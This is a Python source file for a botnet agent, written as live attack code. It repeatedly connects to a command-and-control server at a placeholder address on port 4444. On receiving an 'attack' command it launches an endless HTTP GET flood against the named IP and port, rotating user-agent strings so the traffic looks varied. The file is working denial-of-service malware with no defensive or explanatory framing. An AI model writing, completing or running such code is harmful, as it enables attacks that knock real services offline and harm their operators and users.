import socket
import threading
import random

C2_SERVER = "C2_SERVER_IP"  # c2_server ip
C2_PORT = 4444

def connect_to_c2():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((C2_SERVER, C2_PORT))
            while True:
                command = client.recv(1024).decode()
                if command.startswith("attack"):
                    _, target_ip, target_port = command.split()
                    attack_target(target_ip, int(target_port))
                elif command == "exit":
                    client.close()
                    break
        except:
            pass

def attack_target(target_ip, target_port):
    print(f"Attacking {target_ip}:{target_port} with HTTP Flood...")

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 11; SM-G998B)"
    ]

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            http_request = f"GET / HTTP/1.1\r\n"
            http_request += f"Host: {target_ip}\r\n"
            http_request += f"User-Agent: {random.choice(user_agents)}\r\n"
            http_request += "Connection: keep-alive\r\n\r\n"

            s.send(http_request.encode())
            s.close()
        except:
            pass

if __name__ == "__main__":
    threading.Thread(target=connect_to_c2).start()
